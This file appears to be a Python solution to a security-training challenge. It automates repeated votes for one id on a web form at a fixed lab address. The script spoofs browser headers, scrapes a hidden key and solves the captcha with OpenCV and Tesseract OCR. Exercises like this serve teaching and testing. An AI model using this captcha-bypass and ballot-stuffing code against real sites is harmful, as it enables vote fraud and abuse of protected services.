#!/usr/bin/python3
"""5-script module"""
import requests
from bs4 import BeautifulSoup
import pytesseract
import cv2
import numpy as np


url = "http://158.69.76.135/level5.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0)'
           + ' Gecko/20100101 Firefox/100.0', 'referer': url}
cap_url = "http://158.69.76.135/tim.php"
i = 0

while i < 1024:
    session = requests.Session()
    auth = session.get(url, headers=headers).text
    soup = BeautifulSoup(auth, 'html.parser')
    with open('captcha.png', 'wb') as f:
        f.write(session.get(cap_url).content)
    img = cv2.imread('captcha.png')
    black = np.where((img[:, :, 0] == 0) & (img[:, :, 1] == 0) &
                     (img[:, :, 2] == 0))
    img[black] = (128, 128, 128)
    other = np.where((img[:, :, 0] != 128) & (img[:, :, 1] != 128) &
                     (img[:, :, 2] != 128))
    white = np.where((img[:, :, 0] == 128) & (img[:, :, 1] == 128) &
                     (img[:, :, 2] == 128))
    img[other] = (0, 0, 0)
    img[white] = (255, 255, 255)
    conf = '-l eng --oem 3 --psm 6'
    cap = pytesseract.image_to_string(img, config=conf)[:-2]
    key = soup.find(type="hidden")['value']
    data = {'id': "4281", 'holdthedoor': "submit", 'key': key, 'captcha': cap}
    check = session.post(url, data=data, headers=headers)
    if str(check.content) != "b'See you later hacker! [11]'":
        i += 1
